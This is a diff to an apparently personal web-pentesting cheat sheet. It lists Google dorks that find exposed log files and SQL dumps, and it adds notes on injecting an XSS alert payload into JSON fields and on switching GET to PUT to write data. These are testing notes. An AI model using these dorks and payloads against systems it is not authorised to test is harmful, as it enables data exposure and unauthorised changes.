@@ -12,6 +12,24 @@ google dorks :
   
   allintext:username filetype:log     >> find log files 
   ext:sql intext:"-- phpMyAdmin SQL Dump"
+  
+  
+  
+  ----------------------------------------------------------------------------------------------
+                    JSON EXPLOIT
+  
+  inject json value of request with xss 
+  {"description":"<script>alert(\"hossam\")"}
+  try to change the method from get to put to inject database
+  
+  if json is only in respone take it and modify and then 
+  PUT /file.txt
+  {"description":"<script>alert(\"hossam\")"}
+
+  
+  
+  
+  
  
  
  ----------------------------------------------------------------------------------------------
